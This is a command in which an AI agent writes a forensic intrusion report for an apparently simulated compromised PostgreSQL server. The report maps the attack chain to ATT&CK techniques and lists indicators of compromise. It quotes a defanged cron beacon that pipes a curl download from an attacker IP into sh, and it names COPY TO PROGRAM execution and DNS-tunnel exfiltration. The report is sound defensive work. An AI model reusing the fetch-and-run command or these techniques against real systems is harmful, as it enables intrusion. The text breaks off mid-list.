Sending keys: ["cat <<'EOF' > /app/intrusion-report.md\n# Post-Compromise Intrusion Report\n\n## Executive Summary\nOn host `postgres-prod-01`, an external attacker exploited weak database authentication configuration to gain initial access, execute system commands via PostgreSQL, exfiltrate data via DNS tunneling, establish redundant persistence mechanisms (cron and systemd), and perform timestomping anti-forensic techniques. Endpoint detection and security product telemetry (`/sas/alerts.json`) captured only a subset of the intrusion chain. Forensic analysis of `/disk` revealed additional silent persistence and C2 infrastructure.\n\n## Attack Chain & ATT&CK Mapping\n\n### Step 1: Valid Accounts / Weak Authentication (T1078)\n- **Description**: PostgreSQL server was exposed with weak superuser authentication and permissive `trust` authentication rules for all external IP addresses.\n- **Alerted Status**: Alerted via baseline check (`/sas/alerts.json:17`, `/sas/baseline.json:3`).\n- **Evidence**: `/disk/var/lib/pgsql/data/pg_hba.conf:3` (`trust` auth configured for `0.0.0.0/0`).\n\n### Step 2: Unix Shell Command Execution via COPY PROGRAM (T1059.004)\n- **Description**: Attacker leveraged PostgreSQL's `COPY ... TO PROGRAM` feature to execute arbitrary shell commands under the `postgres` system account, dropping a malicious executable payload.\n- **Alerted Status**: Dropper payload alerted (`/sas/alerts.json:3`).\n- **Evidence**: `/disk/var/lib/pgsql/.local/pgdaemon` (Dropper sample, SHA256: `c7e7e38fa8ffb3ba9b679b14d14ba7196d89d0c691c53f6bac576dee284cd603`).\n\n### Step 3: DNS-Tunnel Exfiltration & C2 (T1048.003)\n- **Description**: Attacker configured DNS-tunneling for command-and-control and data exfiltration. Domain queries were routed through `update-postgres.example.cn`.\n- **Alerted Status**: **SILENT** (Not present in `/sas/alerts.json`).\n- **Evidence**: `/disk/etc/pgdaemon.conf:3` (DNS tunneling resolver config) and `/disk/var/lib/.cache/.wiped.bin:1` (recovered C2 beacon data indicating C2 traffic to IP `198.51.100.214` and resolver `update-postgres.example.cn`).\n\n### Step 4: Cron Persistence (T1053.003)\n- **Description**: Attacker installed a cron job under user `postgres` executing periodic `curl` commands to re-download dropper payloads from `198.51.100.214`.\n- **Alerted Status**: Alerted (`/sas/alerts.json:10`).\n- **Evidence**: `/disk/var/spool/cron/postgres:5` (`# * * * * * root <defanged beacon: curl hxxp://198.51.100.214/x | sh>`).\n\n### Step 5: Systemd Service Persistence (T1543.002)\n- **Description**: Attacker installed a silent systemd service `pg-metrics.service` configured to execute the `pgdaemon` re-dropper on boot/startup.\n- **Alerted Status**: **SILENT** (Not present in `/sas/alerts.json`).\n- **Evidence**: `/disk/etc/systemd/system/pg-metrics.service:5` (`ExecStart launches an xmrig / pgdaemon re-dropper`). Note: `/disk/etc/systemd/system/pg-backup.service:3` was inspected and verified as a legitimate, benign scheduled backup job.\n\n### Step 6: Timestomp Anti-Forensics (T1070.006)\n- **Description**: Attacker modified timestamp metadata on dropped binaries to match system binaries (`/bin/ls`) to impede forensic timeline analysis.\n- **Alerted Status**: **SILENT** (Not present in `/sas/alerts.json`).\n- **Evidence**: `/disk/var/lib/pgsql/.local/.timestamps:2` (`timestomp anti-forensics: mtime backdated to match /bin/ls`).\n\n## Key Entities & Indicators of Compromise (IoCs)\n- **Attacker Source IP**: `198.51.100.214` (`/sas/cti/advisory.txt:6`, `/disk/var/spool/cron/postgres:5`, `/disk/var/lib/.cache/.wiped.bin:1`)\n- **C2 / Resolver Domain**: `update-postgres.example.cn` (`/sas/cti/advisory.txt:17`, `/disk/etc/pgdaemon.conf:3`, `/disk/var/lib/.cache/.wiped.bin:1`)\n- **Mining Pool URI**: `stratum+tcp://xmr.postgres.evil:3333` (`/sas/cti/advisory.txt:18`, `/disk/var/lib/pgsql/.local/pgdaemon:6`)\n- **Wallet Address**: `4A000000000000000000c5f08041507f` (`/sas/cti/advisory.txt:19`, `/disk/var/